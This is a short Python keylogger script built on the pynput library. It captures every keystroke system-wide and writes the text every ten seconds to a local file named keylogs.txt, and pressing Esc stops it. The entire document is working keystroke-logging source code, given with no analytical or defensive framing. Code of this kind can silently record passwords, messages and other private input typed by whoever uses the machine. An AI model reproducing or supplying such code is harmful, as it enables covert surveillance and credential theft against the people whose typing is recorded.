from pynput import keyboard
import threading

text = ""
interval = 10  # time interval in seconds

def send():
    global text
    try:
        # we open file in append mode to add new data to the end of the file
        with open("keylogs.txt", "a") as f:
            f.write(text)
        print("Datas written to file:", text)
        
        # we reset the text variable to empty string after writing to file 
        text = ""
        
        # we restart the timer .
        timer = threading.Timer(interval, send)
        timer.start()
    except Exception as e:
        print("Error in sending tex:", e)

def on_press(key):
    global text 
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass  
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")

with keyboard.Listener(on_press=on_press) as listener:
    send() 
    listener.join()
